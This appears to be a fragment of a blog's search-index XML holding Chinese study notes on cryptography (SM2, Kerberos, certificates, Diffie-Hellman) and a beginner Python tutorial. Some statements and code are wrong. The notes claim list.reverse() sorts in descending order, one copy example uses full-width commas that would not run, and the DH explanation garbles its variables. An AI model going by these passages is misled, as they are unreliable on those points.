src="https://www.helloimg.com/images/2023/08/20/oSzoLA.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/23/oSfan0.png" alt="image.png"></p><p><strong>(5) 了解国密SM2</strong><br>SM2是一种基于椭圆曲线密码学的公钥密码算法，由中国密码标准化工作组推荐<br>SM2算法的主要内容包括３部分：<br>数字签名算法；密钥交换协议；公钥加密算法；<br><strong>SM2算法的特点</strong>如下：</p><ol><li>安全性高：SM2算法采用了椭圆曲线密码学中的离散对数问题，能够提供较高的安全性。</li><li>签名速度快：SM2算法的签名速度比传统RSA算法要快，适合用于大量数据的签名操作。</li><li>密钥长度短：SM2算法的密钥长度比传统RSA算法要短，节省了存储空间和传输带宽。</li><li>支持国密标准：SM2算法是中国国家密码局发布的国家密码算法标准，符合国密要求，</li><li>公开透明：SM2算法设计和安全性分析是公开透明的，有助于对算法的安全性进行评估和验证。</li></ol><h1 id="5-身份鉴别技术"><a href="#5-身份鉴别技术" class="headerlink" title="5.身份鉴别技术"></a>5.身份鉴别技术</h1><p><strong>(1) 身份鉴别的基本方式(鉴别实体所知、所拥有、所具有的唯一特征)</strong><br>验证实体所知什么，如一个秘密的口令或通行字。<br>验证实体拥有什么，如信物、通行证、智能IC卡。<br>验证实体不可改变的特性，如指纹、声音等生物学测定得来的标识特征。</p><p><strong>(2)基于动态口令的身份鉴别原理与实现方案</strong><br>一次性口令的主要思路是：在登录过程中加入不确定因素，使每次登录传送的鉴别信息都不相同，以提高登录过程安全性。</p><p><strong>(3)密码协议对抗重放攻击的两种基本方法（时间戳、质询-响应机制）</strong><br><img src="https://www.helloimg.com/images/2023/08/23/oSf17m.png" alt="image.png"></p><p><img src="https://www.helloimg.com/images/2023/08/23/oSfXBh.png" alt="image.png"><br><strong>(4) Kerberos 系统的密码学特点(基于对称密码体制)和基本原理</strong><br>Kerberos 是一种网络身份验证协议，它基于对称密码体制来提供身份验证和授权服务。Kerberos 的密码学特点主要包括以下几个方面：</p><ol><li>对称加密算法：Kerberos 使用对称密码体制中的加密算法来保证通信机密性，这些算法包括 DES、3DES、AES 等。</li><li>密钥分发：Kerberos 采用密钥分发技术，即在用户登录时，Kerberos 服务器会向用户分发一个临时密钥（也称为票据授权票据TGT），用户在后续的通信中使用该密钥来进行身份验证和授权。</li><li>时钟同步：Kerberos 要求网络中所有的计算机时钟都要与 Kerberos 服务器的时钟同步，以避免时钟漂移带来的安全问题。</li></ol><p><strong>Kerberos 的基本原理如下：</strong></p><ol><li>身份验证：用户在本地计算机上输入用户名和密码，本地计算机将该信息发送给 Kerberos 服务器。Kerberos 服务器验证用户信息的正确性，如果验证通过，Kerberos 服务器向用户发送一个 TGT，该 TGT 包含了用户的身份信息和一个临时密钥。</li><li>授权：用户在访问网络资源时，需要提供 TGT，并向 Kerberos 服务器发起请求。Kerberos 服务器验证 TGT 的正确性，如果通过，就向用户发送一个服务票据（Service Ticket），该票据包含了用户的身份信息和一个用于访问特定资源的临时密钥。</li><li>资源访问：用户使用服务票据来访问网络资源，本地计算机将服务票据发送给资源服务器进行验证，如果通过，用户得到了访问资源的权限。</li></ol><p>总之，Kerberos 是一种安全可靠的身份验证协议，它基于对称密码体制，通过密钥分发、时钟同步等技术来确保安全性和可靠性。</p><h1 id="6-抗抵赖"><a href="#6-抗抵赖" class="headerlink" title="6.抗抵赖"></a>6.抗抵赖</h1><p>对称、非对称加密，数字签名</p><h1 id="7-密钥管理"><a href="#7-密钥管理" class="headerlink" title="7.密钥管理"></a>7.密钥管理</h1><p><strong>(1)管理基本内容和概念</strong><br>密钥管理是一门综合性的技术，涉及密钥的产生、检验、分发、传递、保管、使用、销毁的全部过程，还与密钥的行政管理制度以及人员的素质密切相关。<br>决定整个密码体制安全性的因素是密钥的保密性（“一切秘密予于密钥之中！”）</p><p><strong>(2)理解密钥分配与密钥协商的目标与特点</strong><br>密钥分配与密钥协商过程都是用以在保密通信双方之间安全建立通信所使用的密钥的协议(或机制)<br>密钥分配<br>保密通信中的一方（包括可信第三方）生成并选择秘密密钥，然后将其安全地传送给通信的相关各方。典型协议：Kerboros密钥分配协议<br>密钥协商<br>通常是一种协议，利用该协议通信双方可以在一个公开的信道上通过相互传送一些消息来共同建立一个安全的共享秘密密钥。在密钥协商中，双方共同建立的秘密密钥通常是双方输入消息的一个函数。典型协议： Diffie-Hellman密钥交换协议 </p><p><strong>(3)掌握公钥证书的概念与基本内容,以及证书真实性、有效性的确认(包括用 CA 的公验证数字签名)，持有人的确认方法。</strong><br>公钥证书是一种数字证书，用于验证公钥的真实性和所有者的身份。它包含公钥、所有者的身份信息和证书颁发机构（CA）的数字签名。以下是公钥证书的基本内容：</p><ol><li>：证书中包含了CA的数字签名，以证明该证书是由CA签署的。</li></ol><p>为了确认证书的真实性和有效性，需要使用CA的公钥验证数字签名。这个过程包括以下步骤：</p><ol><li>获取CA的公钥：从CA的网站或其他可靠来源获取CA的公钥。</li><li>验证数字签名：使用CA的公钥验证证书中的数字签名。如果数字签名可以被验证，则证明证书是由CA签署的，因此证书是真实和有效的。</li></ol><p>对于证书的持有人来说，他们可以通过以下方法确认其证书的真实性和有效性：</p><ol><li>查看证书信息：检查证书中包含的信息是否与自己的身份信息匹配。如果信息不匹配，则证书可能是伪造的。</li><li>验证数字签名：使用CA的公钥验证证书中的数字签名。如果数字签名可以被验证，则证明证书是由CA签署的，因此证书是真实和有效的。</li><li>核实证书颁发机构：查看证书中的颁发机构，并确保该机构是可信任的CA。</li><li>检查证书有效期：确保证书在有效期内。如果证书已过期，则证书不再有效。</li></ol><p><strong>(4)Diffie-Hellman 密钥交换算法及安全性基础，熟练掌握计算方法及应用中的相关问题。</strong><br>Diffie-Hellman（DH）密钥交换算法是一种基于离散对数问题的公钥密码学算法，用于在不安全的通信信道上安全地交换密钥。DH 算法的安全性基于离散对数难题，即给定一个大素数 p，以及 a 和 b 两个整数，计算 a^x mod p 和 b^y mod p 的值很容易，但是由 a^x mod p 和 b^y mod p 计算出共享密钥 g^(xy) mod p 则非常困难。<br>DH 密钥交换算法的基本原理如下：</p><ol><li>双方协商素数：双方预先协商一个大素数 p 和一个原根 g。</li><li>双方生成私钥：双方分别生成自己的私钥 x 和 y，私钥是一个随机数。</li><li>双方计算公钥：双方分别根据自己的私钥和协商的素数和原根计算出自己的公钥。</li><li>双方交换公钥：双方将自己的公钥传输给对方。</li><li>双方计算共享密钥：双方使用对方传输过来的公钥以及自己的私钥计算出共享密钥。</li></ol><p>DH 密钥交换算法的计算方法如下：</p><ol><li>双方协商素数：选取一个大素数 p 和一个原根 g。</li><li>双方生成私钥：生成一个随机数 x 和 y，作为自己的私钥。</li><li>双方计算公钥：计算出公钥 A 和 B，其中 A &#x3D; g^x mod p，B &#x3D; g^y mod p。</li><li>双方交换公钥：将 A 和 B 传输给对方。</li><li>双方计算共享密钥：计算出共享密钥 K，其中 K &#x3D; B^x mod p &#x3D; A^y mod p。</li></ol><p>DH 密钥交换算法的安全性主要基于离散对数难题，即计算出共享密钥 K 非常困难。如果攻击者能够通过窃取公开信息或通过其他手段计算出 K，则 DH 密钥交换算法的安全性将受到威胁。因此，在实际应用中，通常需要使用其他加密算法来对 DH 密钥交换算法进行补充，以增强其安全性。<br>总之，DH 密钥交换算法是一种基于离散对数问题的公钥密码学算法，用于在不安全的通信信道上安全地交换密钥。它的安全性基于离散对数难题，通过协商素数、生成私钥、计算公钥、交换公钥和计算共享密钥等步骤来实现。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python从入门到实践</title>
      <link href="/post/c992e850.html"/>
      <url>/post/c992e850.html</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&quot;\n\n按下 enter 键后退出。&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h2><p>Python 可以在同一行中使用多条语句，语句之间使用分号 ; 分割，以下是一个简单的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="print-输出"><a href="#print-输出" class="headerlink" title="print 输出"></a>print 输出</h2><p>print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 end&#x3D;””：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&quot;a&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x )</span><br><span class="line"><span class="built_in">print</span>( y )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---------&#x27;</span>)</span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>( y, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2><p>在 python 用 import 或者 from…import 来导入相应的模块。</p><p>将整个模块(somemodule)导入，格式为： import somemodule</p><p>从某个模块中导入某个函数,格式为： from somemodule import somefunction</p><p>从某个模块中导入多个函数,格式为： from somemodule import firstfunc, secondfunc, thirdfunc</p><p>将某个模块中的全部函数导入，格式为： from somemodule import * </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&quot;a&quot;</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment"># 换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x )</span><br><span class="line"><span class="built_in">print</span>( y )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---------&#x27;</span>)</span><br><span class="line"><span class="comment"># 不换行输出</span></span><br><span class="line"><span class="built_in">print</span>( x, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>( y, end=<span class="string">&quot; &quot;</span> )</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><p> Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</p><p>在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</p><p><strong>等号（&#x3D;）用来给变量赋值。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">counter = <span class="number">100</span>          <span class="comment"># 整型变量</span></span><br><span class="line">miles   = <span class="number">1000.0</span>       <span class="comment"># 浮点型变量</span></span><br><span class="line">name    = <span class="string">&quot;runoob&quot;</span>     <span class="comment"># 字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (counter)</span><br><span class="line"><span class="built_in">print</span> (miles)</span><br><span class="line"><span class="built_in">print</span> (name)</span><br></pre></td></tr></table></figure><p><strong>多个变量赋值</strong><br>Python允许你同时为多个变量赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三个变量被赋予相同的数值</span></span><br><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"><span class="comment">#也可以为多个对象指定多个变量</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;runoob&quot;</span></span><br></pre></td></tr></table></figure><h2 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h2><p>Python3 中常见的数据类型有：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>bool（布尔类型）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><em>不可变数据（3 个）</em>：Number（数字）、String（字符串）、Tuple（元组）；</li><li><em>可变数据（3 个）</em>：List（列表）、Dictionary（字典）、Set（集合）<blockquote><p>此外还有一些高级的数据类型，如: 字节数组类型(bytes)。</p></blockquote></li></ul><h3 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h3><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p><ul><li>int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li><li>bool (布尔), 如 True。</li><li>float (浮点数), 如 1.23、3E-2</li><li>complex (复数), 如 1 + 2j、 1.1 + 2.2j</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> a = <span class="number">111</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="built_in">isinstance</span>(a, <span class="built_in">int</span>))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="literal">True</span></span><br></pre></td></tr></table></figure><blockquote><p>isinstance 和 type 的区别在于：</p><ul><li>type()不会认为子类是一种父类类型。</li><li>isinstance()会认为子类是一种父类类型。</li></ul></blockquote><blockquote><p>注意：Python3 中，bool 是 int 的子类，True 和 False 可以和数字相加， True&#x3D;&#x3D;1、False&#x3D;&#x3D;0 会返回 True，但可以通过 is 来判断类型。</p></blockquote><p><strong>一些操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当你指定一个值时，Number 对象就会被创建：</span></span><br><span class="line">var1 = <span class="number">1</span></span><br><span class="line">var2 = <span class="number">10</span></span><br><span class="line"><span class="comment">#可以通过使用del语句删除单个或多个对象</span></span><br><span class="line"><span class="keyword">del</span> var</span><br><span class="line"><span class="keyword">del</span> var_a, var_b</span><br></pre></td></tr></table></figure><p><strong>数值运算</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 5 + 4  # 加法</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; 4.3 - 2 # 减法</span><br><span class="line">2.3</span><br><span class="line">&gt;&gt;&gt; 3 * 7  # 乘法</span><br><span class="line">21</span><br><span class="line">&gt;&gt;&gt; 2 / 4  # 除法，得到一个浮点数</span><br><span class="line">0.5</span><br><span class="line">&gt;&gt;&gt; 2 // 4 # 除法，得到一个整数</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 17 % 3 # 取余</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 2 ** 5 # 乘方</span><br><span class="line">32</span><br></pre></td></tr></table></figure><h3 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h3><ul><li>Python 中单引号 ‘ 和双引号 “ 使用完全相同。</li><li>使用三引号(‘’’ 或 “””)可以指定一个多行字符串。</li><li>转义符 \。</li><li>反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 r”this is a line with \n” 则 \n 会显示，并不是换行。</li><li>按字面意义级联字符串，如 “this “ “is “ “string” 会被自动转换为 this is string。</li><li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li><li>Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</li><li>Python 中的字符串不能改变。</li><li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li><li>字符串的截取的语法格式如下：变量[头下标:尾下标:步长]</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Runoob&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>)          <span class="comment"># 输出字符串</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])    <span class="comment"># 输出第一个到倒数第二个的所有字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">0</span>])       <span class="comment"># 输出字符串第一个字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>])     <span class="comment"># 输出从第三个开始到第五个的字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>[<span class="number">2</span>:])      <span class="comment"># 输出从第三个开始的后的所有字符</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span> * <span class="number">2</span>)      <span class="comment"># 输出字符串两次，也可以写成 print (2 * str)</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span> + <span class="string">&quot;TEST&quot;</span>) <span class="comment"># 连接字符串</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Runoob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Runoo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>R</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>noo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>noob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>RunoobRunoob</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>RunoobTEST</span><br></pre></td></tr></table></figure><h3 id="bool（布尔类型）"><a href="#bool（布尔类型）" class="headerlink" title="bool（布尔类型）"></a>bool（布尔类型）</h3><p>布尔类型即 True 或 False。</p><p>在 Python 中，True 和 False 都是关键字，表示布尔值。</p><p>布尔类型可以用来控制程序的流程，比如判断某个条件是否成立，或者在某个条件满足时执行某段代码。</p><p>布尔类型特点：</p><ul><li><p>布尔类型只有两个值：True 和 False。</p></li><li><p>布尔类型可以和其他数据类型进行比较，比如数字、字符串等。在比较时，Python 会将 True 视为 1，False 视为 0。</p></li><li><p>布尔类型可以和逻辑运算符一起使用，包括 and、or 和 not。这些运算符可以用来组合多个布尔表达式，生成一个新的布尔值。</p></li><li><p>布尔类型也可以被转换成其他数据类型，比如整数、浮点数和字符串。在转换时，True 会被转换成 1，False 会被转换成 0。</p></li></ul><h3 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h3><p>List（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 <strong>[ ]</strong> 之间、用逗号分隔开的元素列表。</p><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p><p>列表截取的语法格式如下：</p><pre><code>变量[头下标:尾下标]</code></pre><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [ <span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span> ]</span><br><span class="line">tinylist = [<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>)            <span class="comment"># 输出完整列表</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>[<span class="number">0</span>])         <span class="comment"># 输出列表第一个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>[<span class="number">1</span>:<span class="number">3</span>])       <span class="comment"># 从第二个开始输出到第三个元素</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>[<span class="number">2</span>:])        <span class="comment"># 输出从第三个元素开始的所有元素</span></span><br><span class="line"><span class="built_in">print</span> (tinylist * <span class="number">2</span>)    <span class="comment"># 输出两次列表</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span> + tinylist) <span class="comment"># 连接列表</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abcd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">786</span>, <span class="number">2.23</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;abcd&#x27;</span>, <span class="number">786</span>, <span class="number">2.23</span>, <span class="string">&#x27;runoob&#x27;</span>, <span class="number">70.2</span>, <span class="number">123</span>, <span class="string">&#x27;runoob&#x27;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>以下实例用于翻转字符串</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverseWords</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">     </span><br><span class="line">    <span class="comment"># 通过空格将字符串分隔符，把各个单词分隔为列表</span></span><br><span class="line">    inputWords = <span class="built_in">input</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 翻转字符串</span></span><br><span class="line">    <span class="comment"># 假设列表 list = [1,2,3,4],  </span></span><br><span class="line">    <span class="comment"># list[0]=1, list[1]=2 ，而 -1 表示最后一个元素 list[-1]=4 ( 与 list[3]=4 一样)</span></span><br><span class="line">    <span class="comment"># inputWords[-1::-1] 有三个参数</span></span><br><span class="line">    <span class="comment"># 第一个参数 -1 表示最后一个元素</span></span><br><span class="line">    <span class="comment"># 第二个参数为空，表示移动到列表末尾</span></span><br><span class="line">    <span class="comment"># 第三个参数为步长，-1 表示逆向</span></span><br><span class="line">    inputWords=inputWords[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 重新组合字符串</span></span><br><span class="line">    output = <span class="string">&#x27; &#x27;</span>.join(inputWords)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">input</span> = <span class="string">&#x27;I like runoob&#x27;</span></span><br><span class="line">    rw = reverseWords(<span class="built_in">input</span>)</span><br><span class="line">    <span class="built_in">print</span>(rw)</span><br></pre></td></tr></table></figure><h4 id="列表常用方法"><a href="#列表常用方法" class="headerlink" title="列表常用方法"></a>列表常用方法</h4><p>List 内置了有很多方法，例如 append()、pop() 等：</p><ul><li>List.append(x)：在列表末尾添加一个元素</li><li>List.extend([x,y,…])：在列表后扩展一个列表</li><li>List.insert(x,y)：在序号x位置处添加元素y</li><li>List.pop(x)：弹出序号x位置处的元素</li><li>List.clear()：清空列表</li><li>List.sort()：将元素从小到大排序</li><li>List.reverse()：将元素从大到小排序，效果等同于List.sort(reverse&#x3D;True)</li><li>List.count(x)：查找列表中元素x的数量</li><li>List.index(x)：查找列表中元素x的位置</li><li>List.copy：拷贝</li></ul><blockquote><p>因为列表可变，赋值的方式本质是让不同的变量指向同一个对象列表，而列表是可变的，这样会让在改变其中一个列表的值同时改动了其他列表</p></blockquote><blockquote><p>浅拷贝(两种形式)</p></blockquote><ol><li>list_copy1 &#x3D; list.copy</li><li>list_copy2 &#x3D; list[:]</li></ol><blockquote><p>浅拷贝只能拷贝外层的对象，列表多层嵌套时只能拷贝到其引用，此时要使用深拷贝</p></blockquote><blockquote><p>深拷贝(要引用py的copy库)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy </span><br><span class="line"><span class="comment">#浅拷贝</span></span><br><span class="line">x = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]，[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">y = copy.copy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; x</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,0,6]，[7,8,9]]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; y</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,0,6]，[7,8,9]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#深拷贝</span></span><br><span class="line">x = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]，[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">y = copy.deepcopy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; x</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,0,6]，[7,8,9]]</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; y</span></span><br><span class="line"><span class="comment"># [[1,2,3]，[4,5,6]，[7,8,9]]</span></span><br></pre></td></tr></table></figure><h4 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h4><p>形式：**[expression for target in iterable]**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 